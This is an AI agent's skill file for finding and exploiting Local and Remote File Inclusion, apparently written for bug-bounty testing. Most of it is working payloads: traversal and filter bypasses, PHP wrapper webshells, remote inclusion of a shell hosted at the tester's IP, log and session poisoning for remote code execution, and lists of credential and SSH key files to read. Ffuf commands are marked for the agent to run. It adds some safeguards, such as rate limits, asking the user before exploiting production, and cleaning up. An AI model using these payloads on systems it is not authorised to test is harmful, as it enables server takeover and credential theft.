---
name: lfi
description: Local File Inclusion (LFI) and Remote File Inclusion (RFI). Use when HauntMode flags File Inclusion as APPLIES/MAYBE, when a request contains parameters like page=, file=, path=, include=, language=, view=, or any parameter that might determine what file the server loads, or when you need path traversal, PHP wrappers, log poisoning, and second-order LFI methodology.
---

# LFI — Local File Inclusion (and RFI)

This skill covers detection, path traversal, bypass techniques, PHP wrappers, log poisoning, RFI, and second-order LFI — through to RCE.

---

## 1. Triggers — when this skill applies

- Parameters that look like they include or load files: `page=`, `file=`, `path=`, `include=`, `language=`, `lang=`, `view=`, `load=`, `template=`, `module=`, `section=`, `document=`, `log=`
- URL paths with file-like values: `?page=about`, `?view=home`, `?lang=en`
- PHP extensions in URL that change with different page values
- File download endpoints: `/download?file=report.pdf`, `/export?format=csv`
- Any parameter that can be tricked into loading `/etc/passwd` or other local files
- Apps showing verbose PHP errors referencing file paths
- Extensions `.shtml`, `.php`, `.asp` on parameter values
- Second-order contexts: username/filename fields that later get used in file paths

---

---

## 3. 30-second triage

Try the absolute path first, then path traversal:

```
/etc/passwd
../../../../etc/passwd
../../../etc/passwd
../../../../etc/passwd
```

If the response contains `root:x:0:0:` → LFI confirmed. If you get an error mentioning a path → note the web root, adjust traversal depth.

**Windows targets:**
```
../../../../windows/win.ini
../../../../windows/system32/drivers/etc/hosts
```

---

## 4. Pre-flight setup

- Read `program-guidelines.txt` for rate limits before fuzzing
- Note the web root path from verbose errors (e.g., `/var/www/html/`, `/app/`, `/var/www/`)
- Identify the PHP version from headers (`X-Powered-By`) — affects which bypasses work
- Check the parameter behavior: does it append `.php`? Does it strip `../`?

---

## 5. Detection and basic exploitation

### 5.1 Basic path traversal

```
/index.php?language=/etc/passwd
/index.php?language=../../../../etc/passwd
/index.php?language=/../../../etc/passwd
/index.php?language=./languages/../../../../etc/passwd
```

Start from root if absolute path works; if not, traverse from the assumed web root:
```
# If web root is /var/www/html/ and you need /etc/passwd
../../../../etc/passwd      (4 levels up from /var/www/html/)
```

### 5.2 Fuzz the parameter name first if unknown

```bash
[RUN THIS]
ffuf -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt:FUZZ \
  -u 'http://TARGET/index.php?FUZZ=value' -fs <baseline_size>
```

### 5.3 Fuzz LFI payloads once parameter is known

```bash
[RUN THIS]
ffuf -w /usr/share/seclists/Fuzzing/LFI/LFI-Jhaddix.txt:FUZZ \
  -u 'http://TARGET/index.php?language=FUZZ' -fs <baseline_size>
```

---

## 6. Bypass techniques

### 6.1 Non-recursive filter bypass (filter strips `../` once)

When the app does `str_replace('../', '', $input)`:
```
....//....//....//....//etc/passwd
..././..././..././..././etc/passwd
....\/....\/....\/....\/etc/passwd
....////....////etc/passwd
```

### 6.2 URL encoding bypass

```
%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd
..%2F..%2F..%2Fetc%2Fpasswd
```

Double encoding (for double-decode scenarios):
```
%252e%252e%252f%252e%252e%252f%252e%252e%252fetc%252fpasswd
```

### 6.3 Approved path bypass (when app enforces prefix like `./languages/`)

Start with the approved prefix, then traverse out:
```
./languages/../../../../etc/passwd
```

### 6.4 Null byte (PHP < 5.5 only — obsolete but worth trying on old apps)

```
../../../../etc/passwd%00
../../../../etc/passwd%00.php
```

### 6.5 Path truncation (PHP < 5.3 only — obsolete)

Flood with `./` until the appended extension gets cut off at 4096 chars:
```bash
echo -n "non_existing_dir/../../../etc/passwd/" && for i in {1..2048}; do echo -n "./"; done
```

### 6.6 Null byte alternative — append `/./`

```
../../../../etc/passwd/.
../../../../etc/passwd/./././././.
```

---

## 7. PHP filters — source code disclosure

Read PHP source (bypasses execution, returns base64):

```
php://filter/read=convert.base64-encode/resource=config
php://filter/read=convert.base64-encode/resource=index
php://filter/read=convert.base64-encode/resource=../config
php://filter/convert.base64-encode/resource=/var/www/html/index.php
```

Decode output:
```bash
echo 'BASE64_OUTPUT' | base64 -d
```

**Tip:** Use this to read `config.php`, database credentials, and find other PHP files referenced in the code.

Fuzz for PHP files first:
```bash
[RUN THIS]
ffuf -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt:FUZZ \
  -u 'http://TARGET/FUZZ.php' -mc 200,302,403
```

---

## 8. PHP wrappers — RCE

### 8.1 Check if `allow_url_include` is enabled

```
php://filter/read=convert.base64-encode/resource=../../../../etc/php/7.4/apache2/php.ini
```

Decode and grep:
```bash
echo 'OUTPUT' | base64 -d | grep allow_url_include
```

### 8.2 data:// wrapper (requires `allow_url_include = On`)

```bash
# Create payload
echo '<?php system($_GET["cmd"]); ?>' | base64
# PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8+Cg==

# Use it
/index.php?language=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8%2BCg%3D%3D&cmd=id
```

### 8.3 php://input wrapper (requires `allow_url_include = On`)

```bash
curl -s -X POST --data '<?php system($_GET["cmd"]); ?>' \
  "http://TARGET/index.php?language=php://input&cmd=id"
```

### 8.4 expect:// wrapper (requires `extension=expect` in php.ini)

Check php.ini for `extension=expect`, then:
```
/index.php?language=expect://id
```

### 8.5 zip:// wrapper (requires file upload + LFI)

```bash
echo '<?php system($_GET["cmd"]); ?>' > shell.php
zip shell.jpg shell.php
# Upload shell.jpg to the app
```

Then include:
```
/index.php?language=zip://./profile_images/shell.jpg%23shell.php&cmd=id
```

### 8.6 phar:// wrapper (requires file upload + LFI)

```php
<?php
$phar = new Phar('shell.phar');
$phar->startBuffering();
$phar->addFromString('shell.txt', '<?php system($_GET["cmd"]); ?>');
$phar->setStub('<?php __HALT_COMPILER(); ?>');
$phar->stopBuffering();
```

```bash
php --define phar.readonly=0 shell.php && mv shell.phar shell.jpg
# Upload shell.jpg
```

Then include:
```
/index.php?language=phar://./profile_images/shell.jpg%2Fshell.txt&cmd=id
```

---

## 9. Remote File Inclusion (RFI)

**Verify RFI is possible:**
- `allow_url_include = On` (check via LFI → php.ini read)
- Test with a local URL first: `http://127.0.0.1:80/index.php`

**HTTP RFI:**
```bash
echo '<?php system($_GET["cmd"]); ?>' > shell.php
python3 -m http.server 9090
# Then:
/index.php?language=http://YOUR_IP:9090/shell.php&cmd=id
```

**FTP RFI:**
```bash
python3 -m pyftpdlib -p 21
/index.php?language=ftp://YOUR_IP/shell.php&cmd=id
```

**SMB RFI (Windows targets only):**
```bash
impacket-smbserver -smb2support share $(pwd)
/index.php?language=\\YOUR_IP\share\shell.php&cmd=whoami
```

---

## 10. Log poisoning — RCE via LFI

### 10.1 Apache access.log

Confirm you can read the log:
```
/index.php?language=/var/log/apache2/access.log
```

Poison the User-Agent:
```bash
curl -s "http://TARGET/index.php" -A "<?php system(\$_GET['cmd']); ?>"
```

Then RCE:
```
/index.php?language=/var/log/apache2/access.log&cmd=id
```

**Common log paths:**
```
/var/log/apache2/access.log
/var/log/apache2/error.log
/var/log/nginx/access.log
/var/log/nginx/error.log
/var/log/sshd.log
/var/log/vsftpd.log
/var/log/mail
```

### 10.2 Nginx logs

Same technique — readable by `www-data` by default (unlike Apache which requires higher privileges):
```
/var/log/nginx/access.log
```

### 10.3 PHP session poisoning

Find your session ID in browser, then:
```
/index.php?language=/var/lib/php/sessions/sess_YOUR_PHPSESSID
```

Poison the session by setting a PHP-controlled parameter:
```
/index.php?language=<?php system($_GET["cmd"]); ?>
```

(URL encoded: `%3C%3Fphp%20system%28%24_GET%5B%22cmd%22%5D%29%3B%3F%3E`)

Then read the session file + RCE:
```
/index.php?language=/var/lib/php/sessions/sess_YOUR_PHPSESSID&cmd=id
```

**Windows PHP sessions:** `C:\Windows\Temp\sess_PHPSESSID`

### 10.4 /proc/self/fd/ and /proc/self/environ

```
/proc/self/environ
/proc/self/fd/0
/proc/self/fd/1
/proc/self/fd/2
```

These contain User-Agent and other controllable values. Poison User-Agent and include via `/proc/self/fd/N`.

---

## 11. LFI + uploaded file (without wrappers)

If the app has file upload:

**GIF magic bytes webshell:**
```bash
echo 'GIF8<?php system($_GET["cmd"]); ?>' > shell.gif
# Upload shell.gif, note path (e.g., /profile_images/shell.gif)
/index.php?language=./profile_images/shell.gif&cmd=id
```

---

## 12. Key files to read after confirming LFI

**Linux:**
```
/etc/passwd
/etc/shadow
/etc/hosts
/etc/hostname
/etc/os-release
/proc/self/environ
/proc/self/cmdline
/proc/version
/var/www/html/config.php
/var/www/html/.env
/home/<user>/.ssh/id_rsa
/home/<user>/.bash_history
/root/.ssh/id_rsa
/root/.bash_history
/etc/apache2/apache2.conf
/etc/nginx/nginx.conf
/etc/php/7.4/apache2/php.ini
```

**Windows:**
```
C:\Windows\win.ini
C:\Windows\system32\drivers\etc\hosts
C:\Windows\system32\inetsrv\config\applicationHost.config
C:\inetpub\wwwroot\web.config
C:\xampp\apache\conf\httpd.conf
C:\xampp\php\php.ini
```

---

## 13. Second-order LFI

Second-order LFI occurs when user input (stored in a database or session) is used in a file path later, not immediately. The injection point and the execution point are different.

**Pattern:**
1. Input (e.g., username or filename) is stored without path traversal filtering
2. Later, the app constructs a file path using that stored value
3. Change the stored value to contain `../` to escape the intended directory

**Example exploit chain from notes:**
1. Change filename to target filename (e.g., `poc`)
2. Change username to `../../tmp` (bypassing filename filter by attacking username field)
3. Fetch file — app reads from `/var/www/../../tmp/poc.txt`

**What to look for:**
- Apps that let you change username/filename/display name without the traversal filter on that field
- Apps where one field is used as a directory and another is used as a filename
- Any mismatch between what's filtered and what's used in file paths

---

## 14. Automated scanning (give to user to run)

```bash
# Fuzz LFI payloads
[RUN THIS]
ffuf -w /usr/share/seclists/Fuzzing/LFI/LFI-Jhaddix.txt:FUZZ \
  -u 'http://TARGET/index.php?language=FUZZ' -fs <baseline>

# Fuzz webroot to determine depth
[RUN THIS]
ffuf -w /usr/share/seclists/Discovery/Web-Content/default-web-root-directory-linux.txt:FUZZ \
  -u 'http://TARGET/index.php?language=../../../../FUZZ/index.php' -fs <baseline>

# Fuzz for log/config file paths
[RUN THIS]
ffuf -w LFI-WordList-Linux:FUZZ \
  -u 'http://TARGET/index.php?language=../../../../FUZZ' -fs <baseline>
```

---

## 15. False-positive checks

- **Directory listing instead of file content** — the parameter controls a directory, not a file inclusion. Different vuln class.
- **Path reflected in error message but file not read** — the file path is used in a 404 error but the file content isn't returned. Check for different responses with `/etc/passwd` vs `/etc/NONEXISTENT`.
- **PHP file executed but not read** — `include()` executes PHP but source not visible. Use `php://filter` to confirm. The fact that you can execute PHP files is still LFI.
- **Static file server with path traversal** — if the app serves static files and path traversal works on them, that's LFI/directory traversal but scope of exploitation differs from PHP include().

---

## 16. Chain candidates

| Chain | Other skill | Impact uplift |
|---|---|---|
| LFI → read config.php / .env → credentials | `sqli`, `auth-bypass` | DB access, login bypass |
| LFI → read SSH private keys | (direct) | SSH login to server |
| LFI + log poisoning → RCE | `cmdi` (post-RCE) | Full server takeover |
| LFI via PHP wrapper data:// → webshell | `cmdi` | RCE |
| LFI via zip/phar + file upload | `file-upload` | RCE via combined finding |
| Second-order LFI via username/filename field | `idor` (access control mindset) | Escalate functional bug to security issue |
| LFI → read /proc/self/environ → poison User-Agent → RCE | (this skill) | RCE without file write |
| LFI to RFI (if allow_url_include=On) | (this skill) | Remote webshell |
| LFI → SSRF (if file:// maps to internal HTTP) | `ssrf` | Internal network access |

---

## 17. Reporting template

```
POTENTIAL FINDING: Local File Inclusion
Target: <full URL of vulnerable endpoint>
Parameter: <param name + location: query/body/header>
Type: <LFI | RFI | LFI via PHP wrapper | Second-order LFI>
Traversal depth confirmed: <e.g. "4 levels — ../../../../etc/passwd">
Working payload:
    <exact URL/value>
Files confirmed readable:
    /etc/passwd — <yes/no>
    <other sensitive files confirmed>
RCE achieved: <yes via log poisoning / php wrapper / no>
RCE method (if yes):
    <exact steps: poison log via User-Agent → include log path>
Impact:
    <e.g. "Arbitrary file read from server filesystem, including /etc/shadow and SSH private keys" OR
     "RCE achieved via Apache log poisoning — command execution as www-data">
Second-order context: <if applicable — describe stored value and how it's later used>
Chain potential: <list other skills/findings combined>
Next step: <e.g. "Attempt log poisoning for RCE" OR "Read config.php for credentials" OR "Confirm RFI with allow_url_include check">
```

---

## 18. Recon tracker vector strings

Only log if the user explicitly authorizes (see CLAUDE.md "CRITICAL RULE"):

- `lfi:traversal:<param>` — path traversal confirmed in named param
- `lfi:etc-passwd` — /etc/passwd confirmed readable
- `lfi:source-disclosure:<file>` — PHP source read via filter
- `lfi:rce:log-poisoning` — RCE via log poisoning
- `lfi:rce:wrapper:<type>` — RCE via named PHP wrapper
- `lfi:rfi` — remote file inclusion confirmed
- `lfi:second-order:<field>` — second-order LFI via named field
- `lfi:filter-bypass:<technique>` — non-trivial bypass required
- `lfi:no:<param>` — confirmed not exploitable (filtering effective)
- `lfi:chain:<other-vuln>` — LFI used to reach another vuln class

---

## 19. What NOT to do

- **Do not read `/etc/shadow` and exfiltrate the full hash dump** beyond proving readability — you don't need all user hashes to prove the bug.
- **Do not poison production logs with persistent webshells** — use a one-time payload and clean up. Note original log state before poisoning.
- **Do not attempt RCE in production via log poisoning without user approval** — the User-Agent is logged in every request; once poisoned, any inclusion of the log triggers the shell.
- **Do not report path traversal in a static file server as LFI** without confirming file read — must actually retrieve file content.
- **Do not test RFI without first confirming `allow_url_include`** via the php.ini read — hitting your own server repeatedly without this check wastes requests and may trip rate limits.
- **Do not auto-log to the recon tracker** without explicit user instruction (CLAUDE.md hard rule).
